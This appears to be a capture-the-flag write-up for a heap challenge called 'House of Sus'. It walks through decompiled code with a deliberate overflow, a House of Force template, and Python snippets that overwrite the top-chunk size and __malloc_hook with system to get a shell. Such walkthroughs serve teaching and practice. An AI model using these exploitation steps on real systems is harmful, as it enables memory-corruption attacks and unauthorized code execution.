# House of Sus
This is a heap-based challenge which was kinda funny to solve, so let's dive in by looking at the binary

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/c63ff372-8b5a-4126-80ff-4020f2be993f)

Here is what we get when we run it, and it seems like amongus in a different interface, btw we have a leak of the heap base and three operations that we can use, they are not very clear, so we will use ghidra to decompile it

Option 3
```c
void call_emergency_meeting(void)   {
  long in_FS_OFFSET;
  char tmp;
  ulong resp_size;
  char *response;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\nWhy\'d you call an emergency meeting?! I was doing my tasks >:(");
  printf("\nUh oh, you\'ve been called out, how many characters will your response be? ");
  __isoc99_scanf("%lu%c",&resp_size,&tmp);
  printf("Enter your response: ");
  response = (char *)malloc(resp_size);
  // No malloc return check
  fgets(response,0x40,stdin);
  // Always 0x40 bytes to write, so chunk of 0x20 == overflow
  printf("\nYou responded: %s\n",response);
  vote();
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    // WARNING: Subroutine does not return
    __stack_chk_fail();
  }
  return;
```
Thats the only option that we need to exploit the entire code, or a function which calls malloc of a custom size without checking any return error of the function, even more in every case this function will let us to write 0x40 bytes to the chunk no matter the size allocated. This means that we can allocate a chunk smaller in order to have an overflow.
## House of Force
To sum up we have a `heap-base` leak, an overflow, and a vulnerable libc or the `2.27`. These are all the assumptions that we need to exploit the House of Force, which let us to allocate an arbitrary address by changing the wilderness size. Below there is template file to understand it.

```c
// Source https://heap-exploitation.dhavalkapil.com/attacks/house_of_force
// Attacker will force malloc to return this pointer
char victim[] = "This is victim's string that will returned by malloc"; // At 0x601060

struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[10];               // padding
};

struct chunk_structure *chunk, *top_chunk;
unsigned long long *ptr;
size_t requestSize, allotedSize;

// First, request a chunk, so that we can get a pointer to top chunk
ptr = malloc(256);                                                    // At 0x131a010
chunk = (struct chunk_structure *)(ptr - 2);                          // At 0x131a000

// lower three bits of chunk->size are flags
allotedSize = chunk->size & ~(0x1 | 0x2 | 0x4);

// top chunk will be just next to 'ptr'
top_chunk = (struct chunk_structure *)((char *)chunk + allotedSize);  // At 0x131a110

// here, attacker will overflow the 'size' parameter of top chunk
top_chunk->size = -1;       // Maximum size

// Might result in an integer overflow, doesn't matter
requestSize = (size_t)victim            // The target address that malloc should return
                - (size_t)top_chunk     // The present address of the top chunk
                - 2*sizeof(long long)   // Size of 'size' and 'prev_size'
                - sizeof(long long);    // Additional buffer

// This also needs to be forced by the attacker
// This will advance the top_chunk ahead by (requestSize+header+additional buffer)
// Making it point to 'victim'
malloc(requestSize);                                                  // At 0x131a120

// The top chunk again will service the request and return 'victim'
ptr = malloc(100);                                // At 0x601060 !! (Same as 'victim')
```

This simply proves that by overwriting the `wilderness` or the `top-chunk` size to `0xFFFFFFFFFFFFFFFF` as well as `-1` we are able to allocate an arbitrary chunk.
The idea is that when we make a new malloc call the `top-chunk` will move lower and lower in order to reserve us the wanted memory, usually the `wilderness` reaches zero, the next malloc will proc the `brk` call to get even more memory, but if we overwrite it to `0xFFFFFFFFFFFFFFFF` we are able to move through all the memory untill the desired address.
## Exploitation
So that's the plan now we need a target to overwrite, and is pretty obvious or the `__malloc_hook` which if not equal to zero, calls the specified function. Like this if we overwrite it with `system` or `one-gadget` it will call them the next time we will make a `malloc` call.

The last thing we need is a libc leak. To get it is just a piece of cake, because there is a given function which leaks the `seed`.

Option 2
```c
void report(void){
  if (tasks_completed == '\0') {
    puts("\nDo your tasks!");
  }
  else {
    printf("\nIf you want to game the system before you vote... here\'s the seed: %lu\n",seed);
    vote();
  }
  return;
}
```

To start out we will create two functions to fetch the leaks and calculate each base.

```python
def get_leak():
    p.recvuntil(b"game: ", timeout=0.5)
    leak = int(p.recvline().strip(), 16) + 0x1050

    return leak

def rand_leak():
    p.sendlineafter(b"choice: ", b"2", timeout=0.5)
    p.recvuntil(b"seed: ", timeout=0.5)
    leak = int(p.recvline().strip(), 10)
    p.sendlineafter(b"choice: ", b"3", timeout=0.5)
    
    return leak
```

Then we need to overwrite the topchunk size with a malloc call, from the third option

```python
# Used to pad because of a huge chunk betweend us and the wilderness
call_emergency(0xa, b"aaaa", 3)
payload = flat(
    b"A" * 0x10,
    p64(NULL),
    p64(0xffffffffffffffff),
)
# Actual chunk to overwrite the size
call_emergency(0xa, payload, 3)
```

Here is the heap layout

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/22d8b35f-ed30-4014-84db-0682072557c6)

Now we just need the perfect distance between us and the `__malloc_hook`, which is just

```python
result_address = __malloc_hook - chunk_location - 0x20 # -0x20 for the metadata
```

From GDB, the size requested for the malloc call

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/2fba2e9a-2fd9-4c32-bc8b-274d12cedd1c)

Here is the chunk size reached 

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/c7c021ba-c0a2-4f7e-92ec-cebd8c19f9ac)

Thats the `__memalign_hook` which is just before the `__malloc_hook`, so the next malloc call will return it to us.

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/cf9fbc16-7194-4fa2-9dee-b7de1acc6b07)

Here it is! We can now write over it `one-gadget` or just `system` like i did

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/1834daa5-d0b8-4153-a413-072dc64e01d7)

With the last allocation call we will pass the address of `/bin/sh` to it and get a shell

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/04f7ef20-7419-4de0-a4f1-bfb5ecccf07e)

And... Here is our shell!

![image](https://github.com/Wanasgheo/Writeups/assets/111740362/eee1427b-e319-4af2-bf7e-c5cb90dba926)

Thanks for your attention
0xCY@
